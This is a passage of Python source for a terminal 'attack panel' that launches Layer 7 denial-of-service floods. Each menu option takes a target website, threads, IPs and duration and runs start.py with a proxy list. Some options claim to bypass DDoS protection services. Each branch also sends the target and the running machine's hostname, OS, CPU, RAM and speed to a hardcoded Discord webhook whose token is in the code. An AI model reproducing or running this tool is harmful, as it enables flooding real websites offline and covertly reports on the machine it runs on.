                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py gsb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-projectshield')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-projectshield')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-arvancloud":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-arvancloud \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass ARVAN CLOUD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py avb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-arvancloud')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-arvancloud')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-even":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-even \033[31m: \033[36m Powerfull Layer 7 Attack: EVEN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py even ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-even')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-even')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-dyn":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-dyn \033[31m: \033[36m Powerfull Layer 7 Attack: DYN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py dyn ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-dyn')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-dyn')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-get":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-get \033[31m: \033[36m Powerfull Layer 7 Attack: GET \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py get ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-get')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-get')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-post":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-post \033[31m: \033[36m Powerfull Layer 7 Attack: POST\033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py post ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-post')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(mhgetsend)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embedx.add_embed_field(name='Method:', value='mh-post')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()
                load()
                license()
                menu()
            if kies == "mh-ddosguard":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-ddosguard \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass DDOS GUARD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                mhgetsend = ('python3 start.py dgb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                embed.add_embed_field(name='Method:', value='mh-ddosguard')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
